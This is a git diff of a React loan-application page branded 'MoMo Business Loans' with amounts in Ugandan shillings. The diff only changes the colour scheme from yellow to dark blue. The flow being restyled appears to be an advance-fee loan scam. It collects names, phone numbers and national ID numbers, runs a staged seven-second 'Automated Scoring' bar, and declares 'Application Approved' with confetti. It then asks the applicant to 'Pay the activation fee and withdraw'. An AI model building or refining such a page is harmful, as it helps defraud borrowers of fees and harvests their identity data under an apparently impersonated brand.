@@ -246,7 +246,7 @@ export default function LoanApplication() {
       <PageLoader>
         <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
           {/* Header */}
-          <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+          <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
             <div className="container mx-auto max-w-4xl flex items-center justify-between">
               <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                 <Logo size="sm" />
@@ -254,7 +254,7 @@ export default function LoanApplication() {
                   MoMo <span className="font-normal opacity-90">Business Loans</span>
                 </span>
               </div>
-              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+              <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
                 Step 1: Eligibility Check
               </span>
             </div>
@@ -271,8 +271,8 @@ export default function LoanApplication() {
               </button>
 
               <div className="text-center mb-6">
-                <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-2 border border-[#ffcc00]/30">
-                  <Briefcase className="w-6 h-6 text-gray-900" />
+                <div className="w-12 h-12 rounded-2xl bg-sky-50 text-[#004F71] flex items-center justify-center mx-auto mb-2 border border-sky-200">
+                  <Briefcase className="w-6 h-6 text-[#004F71]" />
                 </div>
                 <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(198,100%,22%)]">
                   Income & Eligibility Check
@@ -294,11 +294,11 @@ export default function LoanApplication() {
                       onClick={() => setHasBusiness('yes')}
                       className={`p-3.5 rounded-2xl border-2 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition cursor-pointer ${
                         hasBusiness === 'yes'
-                          ? 'border-[#ffcc00] bg-[#ffcc00]/15 text-gray-900 shadow-xs'
+                          ? 'border-[#004F71] bg-sky-50 text-gray-900 shadow-xs'
                           : 'border-gray-200 hover:border-gray-300 text-gray-700 bg-white'
                       }`}
                     >
-                      <Store className="w-4 h-4 text-amber-600" />
+                      <Store className="w-4 h-4 text-[#004F71]" />
                       <span>Yes, I have a business</span>
                     </button>
                     <button
@@ -316,7 +316,7 @@ export default function LoanApplication() {
 
                   {/* If Yes: How much does the business generate? */}
                   {hasBusiness === 'yes' && (
-                    <div className="mt-3 p-3.5 rounded-2xl bg-amber-50/60 border border-amber-200 animate-fadeIn">
+                    <div className="mt-3 p-3.5 rounded-2xl bg-sky-50/70 border border-sky-200 animate-fadeIn">
                       <label className="block text-xs font-bold text-gray-700 mb-1">
                         How much does your business generate monthly?
                       </label>
@@ -324,7 +324,7 @@ export default function LoanApplication() {
                         <select
                           value={businessRevenue}
                           onChange={(e) => setBusinessRevenue(e.target.value)}
-                          className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
+                          className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
                         >
                           {businessRevenueRanges.map((r) => (
                             <option key={r} value={r}>
@@ -349,7 +349,7 @@ export default function LoanApplication() {
                       onClick={() => setHasJob('employed')}
                       className={`p-3.5 rounded-2xl border-2 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition cursor-pointer ${
                         hasJob === 'employed'
-                          ? 'border-[#ffcc00] bg-[#ffcc00]/15 text-gray-900 shadow-xs'
+                          ? 'border-[#004F71] bg-sky-50 text-gray-900 shadow-xs'
                           : 'border-gray-200 hover:border-gray-300 text-gray-700 bg-white'
                       }`}
                     >
@@ -380,7 +380,7 @@ export default function LoanApplication() {
                           <select
                             value={jobSalary}
                             onChange={(e) => setJobSalary(e.target.value)}
-                            className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
+                            className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
                           >
                             {salaryRanges.map((s) => (
                               <option key={s} value={s}>
@@ -400,7 +400,7 @@ export default function LoanApplication() {
                           <select
                             value={salaryDate}
                             onChange={(e) => setSalaryDate(e.target.value)}
-                            className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
+                            className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
                           >
                             {salaryDates.map((d) => (
                               <option key={d} value={d}>
@@ -437,7 +437,7 @@ export default function LoanApplication() {
                   id="questionnaire-continue-btn"
                   onClick={() => isEligible && setFlowState('form')}
                   disabled={!isEligible}
-                  className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 disabled:opacity-30 disabled:cursor-not-allowed transition shadow-md flex items-center justify-center gap-2 cursor-pointer mt-4"
+                  className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-30 disabled:cursor-not-allowed transition shadow-md flex items-center justify-center gap-2 cursor-pointer mt-4 border border-[#006591]/40"
                 >
                   {isBlocked ? (
                     <span>Cannot Proceed (Income Required)</span>
@@ -467,9 +467,9 @@ export default function LoanApplication() {
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
         <Logo size="md" />
         <h2 className="text-2xl font-extrabold tracking-tight">
-          MoMo <span className="text-[#ffcc00]">Business Loans</span>
+          MoMo <span className="text-white font-extrabold">Business Loans</span>
         </h2>
-        <Loader2 className="w-12 h-12 text-[#ffcc00] animate-spin" />
+        <Loader2 className="w-12 h-12 text-sky-300 animate-spin" />
         <div className="space-y-4 max-w-sm w-full">
           <div>
             <p className="text-white text-lg sm:text-xl font-extrabold">
@@ -486,13 +486,13 @@ export default function LoanApplication() {
           {/* 7-second Progress Bar */}
           <div className="w-full bg-[hsl(198,80%,28%)] rounded-full h-3 border border-[hsl(198,55%,35%)] overflow-hidden p-0.5">
             <div
-              className="bg-[#ffcc00] h-full rounded-full transition-all duration-150 ease-out"
+              className="bg-sky-400 h-full rounded-full transition-all duration-150 ease-out"
               style={{ width: `${Math.min(loadingProgress, 100)}%` }}
             />
           </div>
-          <div className="flex justify-between items-center text-[11px] text-gray-400 font-semibold px-1">
+          <div className="flex justify-between items-center text-[11px] text-gray-300 font-semibold px-1">
             <span>Automated Scoring</span>
-            <span className="text-[#ffcc00] font-bold">{loadingProgress}%</span>
+            <span className="text-white font-bold">{loadingProgress}%</span>
           </div>
         </div>
       </div>
@@ -507,7 +507,7 @@ export default function LoanApplication() {
           <Confetti />
 
           {/* Header */}
-          <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+          <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
             <div className="container mx-auto max-w-4xl flex items-center justify-between">
               <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                 <Logo size="sm" />
@@ -515,7 +515,7 @@ export default function LoanApplication() {
                   MoMo <span className="font-normal opacity-90">Business Loans</span>
                 </span>
               </div>
-              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+              <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
                 Application Approved
               </span>
             </div>
@@ -590,7 +590,7 @@ export default function LoanApplication() {
                     },
                   })
                 }
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer group"
+                className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-lg flex items-center justify-center gap-2 cursor-pointer group border border-[#006591]/40"
               >
                 <span>Pay the activation fee and withdraw</span>
                 <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
@@ -612,7 +612,7 @@ export default function LoanApplication() {
     <PageLoader>
       <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Header */}
-        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -620,7 +620,7 @@ export default function LoanApplication() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+            <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
               Step 2: Loan Details
             </span>
           </div>
@@ -633,19 +633,19 @@ export default function LoanApplication() {
               <button
                 id="loan-app-back-btn"
                 onClick={() => setFlowState('questionnaire')}
-                className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-xs sm:text-sm font-semibold transition"
+                className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-xs sm:text-sm font-semibold transition cursor-pointer"
               >
                 <ArrowLeft className="w-4 h-4" />
                 <span>Back to Questions</span>
               </button>
-              <span className="text-[11px] sm:text-xs font-bold bg-[#ffcc00]/20 text-gray-800 px-2.5 py-1 rounded-lg">
+              <span className="text-[11px] sm:text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 px-2.5 py-1 rounded-lg">
                 Eligible Candidate ✅
               </span>
             </div>
 
             <div className="text-center mb-5 sm:mb-6">
-              <div className="w-11 h-11 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-2 border border-[#ffcc00]/30">
-                <Building2 className="w-5 h-5 text-gray-800" />
+              <div className="w-11 h-11 rounded-2xl bg-sky-50 text-[#004F71] flex items-center justify-center mx-auto mb-2 border border-sky-200">
+                <Building2 className="w-5 h-5 text-[#004F71]" />
               </div>
               <h2 className="text-xl sm:text-2xl font-extrabold tracking-tight text-[hsl(198,100%,22%)]">
                 Instant MoMo Business Loan Application
@@ -678,7 +678,7 @@ export default function LoanApplication() {
                       value={amountRaw ? `UGX ${parseInt(amountRaw, 10).toLocaleString()}` : ''}
                       onChange={(e) => handleAmountChange(e.target.value)}
                       placeholder="UGX 0"
-                      className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-extrabold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
+                      className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-extrabold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                     />
                   </div>
                   <span className="text-[10px] text-gray-400 mt-0.5 font-medium">
@@ -696,7 +696,7 @@ export default function LoanApplication() {
                       id="select-repayment"
                       value={repayment}
                       onChange={(e) => setRepayment(e.target.value)}
-                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
+                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
                     >
                       {repaymentPeriods.map((p) => (
                         <option key={p} value={p}>
@@ -724,7 +724,7 @@ export default function LoanApplication() {
                       id="select-purpose"
                       value={purpose}
                       onChange={(e) => setPurpose(e.target.value)}
-                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition truncate"
+                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition truncate"
                     >
                       {loanPurposes.map((p) => (
                         <option key={p} value={p}>
@@ -746,7 +746,7 @@ export default function LoanApplication() {
                       id="select-loan-type"
                       value={type}
                       onChange={(e) => setType(e.target.value)}
-                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition truncate"
+                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition truncate"
                     >
                       {loanTypes.map((t) => (
                         <option key={t} value={t}>
@@ -772,7 +772,7 @@ export default function LoanApplication() {
                     value={firstName}
                     onChange={(e) => setFirstName(e.target.value)}
                     placeholder="e.g. John"
-                    className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
+                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                   />
                 </div>
 
@@ -787,7 +787,7 @@ export default function LoanApplication() {
                     value={lastName}
                     onChange={(e) => setLastName(e.target.value)}
                     placeholder="e.g. Kato"
-                    className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
+                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                   />
                 </div>
               </div>
@@ -805,7 +805,7 @@ export default function LoanApplication() {
                     value={phone}
                     onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                     placeholder="e.g. 0785123456"
-                    className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
+                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                   />
                 </div>
 
@@ -819,7 +819,7 @@ export default function LoanApplication() {
                       id="select-gender"
                       value={gender}
                       onChange={(e) => setGender(e.target.value)}
-                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
+                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
                     >
                       {genders.map((g) => (
                         <option key={g} value={g}>
@@ -845,7 +845,7 @@ export default function LoanApplication() {
                     value={idNumber}
                     onChange={(e) => setIdNumber(e.target.value.toUpperCase())}
                     placeholder="e.g. CM98..."
-                    className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400 uppercase"
+                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400 uppercase"
                   />
                 </div>
 
@@ -859,7 +859,7 @@ export default function LoanApplication() {
                       id="select-nationality"
                       value={nationality}
                       onChange={(e) => setNationality(e.target.value)}
-                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
+                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
                     >
                       {nationalities.map((n) => (
                         <option key={n} value={n}>
@@ -878,7 +878,7 @@ export default function LoanApplication() {
                   id="submit-loan-app-btn"
                   type="submit"
                   disabled={!numericAmount}
-                  className="w-full py-3.5 sm:py-4 rounded-xl sm:rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2 cursor-pointer"
+                  className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2 cursor-pointer border border-[#006591]/40"
                 >
                   <span>Submit Application ({formattedAmountDisplay})</span>
                   <ArrowRight className="w-4 h-4" />
